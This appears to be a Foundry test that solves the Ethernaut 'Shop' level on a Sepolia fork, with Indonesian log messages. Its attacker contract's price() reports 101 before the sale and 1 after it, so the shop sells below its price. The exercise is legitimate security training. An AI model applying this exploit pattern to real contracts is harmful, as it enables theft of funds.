// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../22-Shop/ShopFactory.sol";
import "forge-std/Test.sol";

contract ShopAttack is Test {
    function testShop() external {
        vm.createSelectFork(vm.envString("sepolia"));
        Ethernaut ethernaut = new Ethernaut();
        ShopFactory factory = new ShopFactory();
        ethernaut.registerLevel(factory);
        address pembeli = makeAddr("pembeli");
        vm.deal(pembeli, 10 ether);
        vm.startPrank(pembeli, pembeli);
        address addr = ethernaut.createLevelInstance(factory);
        Shop shop = Shop(addr);
        bool belumDiskon = shop.price() == 100;
        assertTrue(belumDiskon);
        emit log("Goal: tawar harga");
        emit log("====================================");
        emit log(
            "pada contract Shop, terdapat interface Buyer dengan fungsi view bernama price(), jadi kita perlu berinteraksi menggunakan contract lain "
        );
        PenawarHandal nawar = new PenawarHandal(address(shop));
        nawar.beli();
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
        emit log(
            "saat pengecekan, price adalah 101 sehingga lolos pengecekan, tetapi ketika isSold menjadi true, price menjadi 1, karena saat pengecekan dan pengembalian nilai sama saja dengan memanggil fungsi price() 2x"
        );
    }
}

contract PenawarHandal {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function beli() external {
        shop.buy();
    }

    function price() external view returns (uint256) {
        //kalo isSold false harganya 101, kalo true harganya 1
        return shop.isSold() ? 1 : 101;
    }
}
